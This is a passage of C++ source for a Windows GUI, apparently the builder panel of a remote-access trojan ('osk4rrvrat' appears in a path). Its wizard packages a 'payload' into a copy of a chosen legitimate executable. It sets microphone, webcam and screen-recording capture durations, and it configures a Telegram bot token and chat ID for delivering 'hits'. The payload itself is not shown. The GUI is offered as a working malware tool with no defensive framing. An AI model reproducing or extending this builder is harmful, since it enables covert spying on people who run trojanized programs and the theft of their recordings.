        const float bodyH = winSize.y - bodyTop - footerH - 8.0f;
        ImGui::SetCursorPos(ImVec2(padL, bodyTop));
        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
        ImGui::BeginChild(
            "##build_wizard_body",
            ImVec2(contentW, bodyH > 80.0f ? bodyH : 80.0f),
            ImGuiChildFlags_None,
            ImGuiWindowFlags_AlwaysVerticalScrollbar);
        ImGui::PopStyleVar();
        ImGui::PopStyleColor();

        if (buildWizardStep == 0) {
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_FOLDER_OPEN, "Original executable");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();

            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextWrapped("This file is required. The payload will be packaged into a copy of it.");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 16.0f));

            {
                const float browseW = 120.0f;
                const float gap = 10.0f;
                // keep controls left-aligned, not full-window stretch
                const float fieldW = 420.0f;
                float pathW = fieldW - browseW - gap;
                if (pathW < 120.0f) pathW = 120.0f;
                ImGui::SetNextItemWidth(pathW);
                ImGui::InputText("##exe_path", selectedExePath, MAX_PATH, ImGuiInputTextFlags_ReadOnly);
                ImGui::SameLine(0.0f, gap);
                char browseLabel[64];
                snprintf(browseLabel, sizeof(browseLabel), "%s  Browse", ICON_FA_FOLDER_OPEN);
                if (styledButton(browseLabel, ImVec2(browseW, 36.0f), true))
                    openExeFileDialog();
            }

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            if (strlen(selectedExePath) > 0) {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Success);
                if (fontIcons) {
                    ImGui::PushFont(fontIcons, fontIcons->LegacySize);
                    ImGui::TextUnformatted(ICON_FA_CHECK);
                    ImGui::PopFont();
                    ImGui::SameLine(0.0f, 8.0f);
                }
                ImGui::Text("%s", selectedExeName);
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
                ImGui::TextUnformatted("No .exe selected yet.");
                ImGui::PopStyleColor();
            }
        } else {
            // Options step - same left layout style
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_GEAR, "Features");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::Dummy(ImVec2(0.0f, 6.0f));

            for (int i = 0; i < 11; ++i)
                styledCheckbox(buildOptionLabels[i], &buildOptions[i]);

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            ImGui::Separator();
            ImGui::Dummy(ImVec2(0.0f, 12.0f));

            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_CLOCK, "Capture durations (seconds)");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextWrapped("Longer times = larger archive and slower Telegram upload.");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 6.0f));

            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Microphone (sec)##mic_dur", &micDurationSec);
            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Webcam (sec)##cam_dur", &webcamDurationSec);
            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Screen record (sec)##scr_dur", &screenDurationSec);

            if (!ImGui::IsAnyItemActive()) {
                if (micDurationSec < 1) micDurationSec = 1;
                if (micDurationSec > 600) micDurationSec = 600;
                if (webcamDurationSec < 1) webcamDurationSec = 1;
                if (webcamDurationSec > 600) webcamDurationSec = 600;
                if (screenDurationSec < 1) screenDurationSec = 1;
                if (screenDurationSec > 600) screenDurationSec = 600;
            }

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            ImGui::Separator();
            ImGui::Dummy(ImVec2(0.0f, 12.0f));

            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_SLIDERS, "Update interval");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextUnformatted("Days between info updates (0 = only on change)");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::SetNextItemWidth(320.0f);
            ImGui::SliderInt("##update_slider", &updateIntervalDays, 0, 30, "%d days");
        }

        ImGui::EndChild();

        // Footer: Exit left, primary right
        const float btnH = 36.0f;
        const float btnY = winSize.y - footerH + 12.0f;
        const float leftX = 28.0f;
        const float rightEdge = winSize.x - 28.0f;

        if (buildWizardStep == 0) {
            const float contW = 130.0f;
            const float exitW = 140.0f;
            const bool hasExe = strlen(selectedExePath) > 0;

            ImGui::SetCursorPos(ImVec2(leftX, btnY));
            char exitLabel[64];
            snprintf(exitLabel, sizeof(exitLabel), "%s  Exit to home", ICON_FA_HOUSE);
            if (styledButton(exitLabel, ImVec2(exitW, btnH), false))
                closeBuildWizard(true);

            ImGui::SetCursorPos(ImVec2(rightEdge - contW, btnY));
            if (!hasExe)
                ImGui::BeginDisabled();
            char contLabel[64];
            snprintf(contLabel, sizeof(contLabel), "%s  Continue", ICON_FA_ARROW_RIGHT);
            if (styledButton(contLabel, ImVec2(contW, btnH), true))
                goBuildWizardStep(1);
            if (!hasExe)
                ImGui::EndDisabled();
        } else {
            const float buildW = 120.0f;
            const float backW = 110.0f;
            const float exitW = 140.0f;
            const float gap = 10.0f;

            ImGui::SetCursorPos(ImVec2(leftX, btnY));
            char backLabel[64];
            snprintf(backLabel, sizeof(backLabel), "%s  Back", ICON_FA_ARROW_LEFT);
            if (styledButton(backLabel, ImVec2(backW, btnH), false))
                goBuildWizardStep(0);

            ImGui::SameLine(0.0f, gap);
            char exitLabel[64];
            snprintf(exitLabel, sizeof(exitLabel), "%s  Exit to home", ICON_FA_HOUSE);
            if (styledButton(exitLabel, ImVec2(exitW, btnH), false))
                closeBuildWizard(true);

            ImGui::SetCursorPos(ImVec2(rightEdge - buildW, btnY));
            char buildLabel[64];
            snprintf(buildLabel, sizeof(buildLabel), "%s  Build", ICON_FA_HAMMER);
            if (styledButton(buildLabel, ImVec2(buildW, btnH), true)) {
                performBuild();
                if (strstr(buildStatusMsg, "Build OK") != nullptr)
                    goBuildWizardStep(2);
            }
        }
    }

    ImGui::PopStyleVar(); // alpha

    // Chrome last so hit-test wins
    if (drawChromeButton("##buildwiz_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##buildwiz_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;
}

static void drawBuildTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Build", "Package payload into an executable");

    // Setup card — text top-left, Configure button lower-right inside same box
    {
        const float panelW = width - Ui::ContentPadding * 2.0f;
        const float padX = 20.0f;
        const float padY = 14.0f;
        const float btnW = 100.0f;
        const float btnH = 32.0f;
        const float panelH = 96.0f;

        ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(padX, padY));
        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
        ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
        ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
        if (ImGui::BeginChild(
                "##build_config",
                ImVec2(panelW, panelH),
                ImGuiChildFlags_Borders,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::TextUnformatted("Setup");
            if (fontMedium) ImGui::PopFont();
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextUnformatted("Pick original EXE, features and durations.");
            ImGui::PopStyleColor();

            const float contentW = ImGui::GetWindowContentRegionMax().x - ImGui::GetWindowContentRegionMin().x;
            const float contentH = ImGui::GetWindowContentRegionMax().y - ImGui::GetWindowContentRegionMin().y;
            ImGui::SetCursorPos(ImVec2(contentW - btnW, contentH - btnH));
            if (styledButton("Configure", ImVec2(btnW, btnH), true)) {
                buildWizardStep = 0;
                buildWizardStepFrom = 0;
                buildWizardStepAnim = 1.0f;
                showBuildPopup = true;
            }
        }
        ImGui::EndChild();
        ImGui::PopStyleColor(2);
        ImGui::PopStyleVar(2);
    }

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 200.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##build_debug",
            ImVec2(width - Ui::ContentPadding * 2.0f, 140.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Test");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Send a test hit to Telegram.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 10.0f));

        if (styledButton("Send test", ImVec2(110.0f, 36.0f), true)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                sendTestHit();
                showNotConfiguredWarning = false;
            } else {
                showNotConfiguredWarning = true;
            }
        }

        const StatusPresentation status = getStatusPresentation();
        if (telegram.getStatus() != TelegramStatus::Idle) {
            ImGui::SameLine(0.0f, 12.0f);
            ImGui::PushStyleColor(ImGuiCol_Text, status.color);
            ImGui::TextUnformatted(status.label);
            ImGui::PopStyleColor();
        }
        if (showNotConfiguredWarning) {
            ImGui::SameLine(0.0f, 12.0f);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
            ImGui::TextUnformatted("Set Telegram first");
            ImGui::PopStyleColor();
        }
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static void drawSettingsTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Telegram", "Bot delivery endpoint");

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##telegram_integration",
            ImVec2(width - Ui::ContentPadding * 2.0f, 190.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 panelPos = ImGui::GetWindowPos();
        const ImVec2 panelSize = ImGui::GetWindowSize();
        ImDrawList* dl = ImGui::GetWindowDrawList();
        const StatusPresentation status = getStatusPresentation();

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Endpoint");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Token and chat for hit delivery.");
        ImGui::PopStyleColor();

        ImGui::SetCursorPos(ImVec2(panelSize.x - 240.0f, 16.0f));
        if (styledButton("Connect", ImVec2(100.0f, 36.0f), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                telegram.verifyConnectionAsync();
            }
        }
        ImGui::SetCursorPos(ImVec2(panelSize.x - 128.0f, 16.0f));
        if (styledButton(configLoaded ? "Edit" : "Setup", ImVec2(108.0f, 36.0f), true))
            showTelegramPopup = true;

        dl->AddLine(
            ImVec2(panelPos.x + 18.0f, panelPos.y + 68.0f),
            ImVec2(panelPos.x + panelSize.x - 18.0f, panelPos.y + 68.0f),
            Ui::color(Ui::Border));

        const ImVec2 statusSize = ImGui::CalcTextSize(status.label);
        ImGui::SetCursorPos(ImVec2(18.0f, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Status");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - statusSize.x, 82.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, status.color);
        ImGui::TextUnformatted(status.label);
        ImGui::PopStyleColor();

        const char* tokenState = configLoaded ? "Configured" : "Missing";
        const ImVec2 tokenSize = ImGui::CalcTextSize(tokenState);
        ImGui::SetCursorPos(ImVec2(18.0f, 116.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Token");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - tokenSize.x, 116.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, configLoaded ? Ui::TextSecondary : Ui::TextMuted);
        ImGui::TextUnformatted(tokenState);
        ImGui::PopStyleColor();

        const char* storageState = configLoaded ? "AppData" : "None";
        const ImVec2 storageSize = ImGui::CalcTextSize(storageState);
        ImGui::SetCursorPos(ImVec2(18.0f, 150.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Storage");
        ImGui::PopStyleColor();
        ImGui::SetCursorPos(ImVec2(panelSize.x - 18.0f - storageSize.x, 150.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
        ImGui::TextUnformatted(storageState);
        ImGui::PopStyleColor();
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static void drawTelegramPopup() {
    if (!showTelegramPopup)
        return;

    ImGui::OpenPopup("Telegram setup##modal");
    const ImVec2 center = ImGui::GetMainViewport()->GetCenter();
    ImGui::SetNextWindowPos(center, ImGuiCond_Appearing, ImVec2(0.5f, 0.5f));
    ImGui::SetNextWindowSize(ImVec2(560.0f, 478.0f), ImGuiCond_Appearing);

    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(28.0f, 25.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 12.0f);
    ImGui::PushStyleColor(ImGuiCol_PopupBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);

    if (ImGui::BeginPopupModal(
            "Telegram setup##modal",
            &showTelegramPopup,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 startCursor = ImGui::GetCursorPos();
        const ImVec2 popupPos = ImGui::GetWindowPos();
        const ImVec2 popupSize = ImGui::GetWindowSize();

        if (drawChromeButton(
                "##close_telegram_modal",
                ImVec2(popupPos.x + popupSize.x - 66.0f, popupPos.y + 25.0f),
                true)) {
            showTelegramPopup = false;
            ImGui::CloseCurrentPopup();
        }
        ImGui::SetCursorPos(startCursor);

        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::TextUnformatted("Telegram setup");
        if (fontHeading) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Configure delivery without leaving the app.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 13.0f));
        ImGui::Separator();
        ImGui::Dummy(ImVec2(0.0f, 13.0f));

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Bot token");
        if (fontMedium) ImGui::PopFont();
        ImGui::Dummy(ImVec2(0.0f, 4.0f));
        ImGui::SetNextItemWidth(-1.0f);
        ImGui::InputText("##token", botTokenBuf, sizeof(botTokenBuf), ImGuiInputTextFlags_Password);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Create or copy it from @BotFather.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 11.0f));

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Chat ID");
        if (fontMedium) ImGui::PopFont();
        ImGui::Dummy(ImVec2(0.0f, 4.0f));
        ImGui::SetNextItemWidth(-1.0f);
        ImGui::InputText("##chatid", chatIdBuf, sizeof(chatIdBuf));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Use @userinfobot to find the destination ID.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 16.0f));
        const float buttonGap = 10.0f;
        const float resetWidth = 92.0f;
        const float connectWidth = 112.0f;
        const float testWidth = 112.0f;
        const float saveWidth = ImGui::GetContentRegionAvail().x - resetWidth - connectWidth - testWidth - buttonGap * 3.0f;
        if (styledButton("Reset", ImVec2(resetWidth, 40.0f), false))
            resetConfig();
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Connect", ImVec2(connectWidth, 40.0f), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                telegram.verifyConnectionAsync();
            }
        }
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Send test", ImVec2(testWidth, 40.0f), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                telegram.sendMessageAsync("Connected.\xe2\x9c\x85");
            }
        }
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Save configuration", ImVec2(saveWidth, 40.0f), true)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0)
                saveConfigToAppData();
        }

        const StatusPresentation status = getStatusPresentation();
        if (telegram.getStatus() != TelegramStatus::Idle) {
            ImGui::PushStyleColor(ImGuiCol_Text, status.color);
            ImGui::TextUnformatted(status.label);
            ImGui::PopStyleColor();
        }

        ImGui::EndPopup();
    }

    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar(2);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    sessionId = generateSessionId();
    telegram.setSessionId(sessionId);

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L,
        hInstance, nullptr, nullptr, nullptr, nullptr, L"AppBuilder", nullptr };
    RegisterClassExW(&wc);

    // Medium centered window
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (screenW - WIN_W) / 2;
    int posY = (screenH - WIN_H) / 2;
    g_hwnd = CreateWindowExW(
        WS_EX_APPWINDOW,
        wc.lpszClassName, L"Builder",
        WS_POPUP | WS_VISIBLE,
        posX, posY, WIN_W, WIN_H,
        nullptr, nullptr, wc.hInstance, nullptr);

    typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
    HMODULE dwm = LoadLibraryW(L"dwmapi.dll");
    if (dwm) {
        auto pDwm = (DwmSetWindowAttribute_t)GetProcAddress(dwm, "DwmSetWindowAttribute");
        if (pDwm) {
            int pref = 2;
            pDwm(g_hwnd, 33, &pref, sizeof(pref));
        }
    }

    if (!CreateDeviceD3D(g_hwnd)) {
        CleanupDeviceD3D();
        UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ShowWindow(g_hwnd, SW_SHOWDEFAULT);
    UpdateWindow(g_hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.IniFilename = nullptr;

    ImFontConfig fontCfg;
    fontCfg.OversampleH = 3;
    fontCfg.OversampleV = 2;
    fontCfg.PixelSnapH = true;
    static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };
    const char* faPathResolved = nullptr;
    {
        const char* faCandidates[] = {
            "assets/fonts/fa-solid-900.ttf",
            "fa-solid-900.ttf",
            "C:/Users/oziet/Downloads/osk4rrvrat/assets/fonts/fa-solid-900.ttf",
        };
        for (const char* faPath : faCandidates) {
            DWORD attr = GetFileAttributesA(faPath);
            if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
                faPathResolved = faPath;
                break;
            }
        }
    }

    auto mergeIcons = [&](ImFont* baseFont) {
        if (!baseFont || !faPathResolved)
            return;
        ImFontConfig icons_cfg;
        icons_cfg.MergeMode = true;
        icons_cfg.PixelSnapH = true;
        icons_cfg.GlyphMinAdvanceX = 14.0f;
        icons_cfg.OversampleH = 2;
        icons_cfg.OversampleV = 2;
        io.Fonts->AddFontFromFileTTF(faPathResolved, baseFont->LegacySize > 0.0f ? baseFont->LegacySize : 14.0f, &icons_cfg, icons_ranges);
    };

    fontBody = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\segoeui.ttf", 14.0f, &fontCfg);
    mergeIcons(fontBody);
    fontMedium = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 14.0f, &fontCfg);
    mergeIcons(fontMedium);
    fontHeading = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 20.0f, &fontCfg);
    mergeIcons(fontHeading);
    fontSplash = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\seguisb.ttf", 34.0f, &fontCfg);

    // Standalone icons font (for large success glyph etc.)
    if (faPathResolved) {
        ImFontConfig icons_cfg;
        icons_cfg.PixelSnapH = true;
        icons_cfg.GlyphMinAdvanceX = 14.0f;
        icons_cfg.OversampleH = 2;
        icons_cfg.OversampleV = 2;
        fontIcons = io.Fonts->AddFontFromFileTTF(faPathResolved, 16.0f, &icons_cfg, icons_ranges);
    }

    if (!fontBody)
        fontBody = io.Fonts->AddFontDefault();
    if (!fontMedium)
        fontMedium = fontBody;
    if (!fontHeading)
        fontHeading = fontMedium;
    if (!fontSplash)
        fontSplash = fontHeading;
    if (!fontIcons)
        fontIcons = fontBody;
    io.FontDefault = fontBody;

    applyModernTheme();

    ImGui_ImplWin32_Init(g_hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    loadConfigFromAppData();

    showAuthLogin = true;

    ImVec4 clear_color = Ui::Canvas;
    bool done = false;

    while (!done) {
        MSG msg;
        while (PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done) break;

        if (requestClose) { done = true; continue; }
        if (requestMinimize) { ShowWindow(g_hwnd, SW_MINIMIZE); requestMinimize = false; }

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        ImGui::SetNextWindowPos(ImVec2(0, 0));
        ImGui::SetNextWindowSize(io.DisplaySize);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 10.0f);
        ImGui::Begin("##Main", nullptr,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
            ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
            ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoScrollbar);

        // Outer border (solid, no glass)
        {
            ImDrawList* dl = ImGui::GetWindowDrawList();
            const ImVec2 wp = ImGui::GetWindowPos();
            const ImVec2 ws = ImGui::GetWindowSize();
            dl->AddRect(
                wp,
                ImVec2(wp.x + ws.x, wp.y + ws.y),
                Ui::color(Ui::BorderStrong),
                10.0f,
                0,
                1.0f);
        }

        if (showSplash) {
            drawSplashScreen();
        } else if (!authLoggedIn && showAuthLogin) {
            drawAuthLoginScreen();
            drawAuthFailPopup();
        } else if (showBuildPopup || buildWizardAnim > 0.001f) {
            // Full-window builder mode (like splash) - no sidebar/title/footer
            drawBuildPopup();
        } else {
            drawTitleBar();
            const float bodyHeight = ImGui::GetContentRegionAvail().y - Ui::FooterHeight;

            ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Sidebar);
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 0.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
            ImGui::BeginChild(
                "##sidebar",
                ImVec2(Ui::SidebarWidth, bodyHeight),
                ImGuiChildFlags_None,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor();
            drawSidebar();
            ImGui::EndChild();

            ImGui::SameLine(0.0f, 0.0f);

            ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Canvas);
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 0.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
            ImGui::BeginChild(
                "##content",
                ImVec2(0.0f, bodyHeight),
                ImGuiChildFlags_None,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor();
            switch (currentTab) {
            case 0:
                drawGeneralTab();
                break;
            case 1:
                drawBuildTab();
                break;
            case 2:
                drawSettingsTab();
                break;
            }
            ImGui::EndChild();

            drawFooter();
            drawTelegramPopup();
        }

        ImGui::End();
        ImGui::PopStyleVar();

        ImGui::Render();
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, (float*)&clear_color);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
    CleanupDeviceD3D();
    DestroyWindow(g_hwnd);
    UnregisterClassW(wc.lpszClassName, wc.hInstance);
    return 0;
}

bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount = 2;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL levels[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };
    HRESULT res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr,
        0, levels, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res == DXGI_ERROR_UNSUPPORTED)
        res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_WARP, nullptr,
            0, levels, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res != S_OK) return false;
    CreateRenderTarget();
    return true;
}

void CleanupDeviceD3D() {
    CleanupRenderTarget();
    if (g_pSwapChain)          { g_pSwapChain->Release();          g_pSwapChain = nullptr; }
    if (g_pd3dDeviceContext)   { g_pd3dDeviceContext->Release();   g_pd3dDeviceContext = nullptr; }
    if (g_pd3dDevice)          { g_pd3dDevice->Release();          g_pd3dDevice = nullptr; }
}

void CreateRenderTarget() {
    ID3D11Texture2D* pBackBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    if (pBackBuffer) {
        g_pd3dDevice->CreateRenderTargetView(pBackBuffer, nullptr, &g_mainRenderTargetView);
        pBackBuffer->Release();
    }
}

void CleanupRenderTarget() {
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = nullptr; }
}
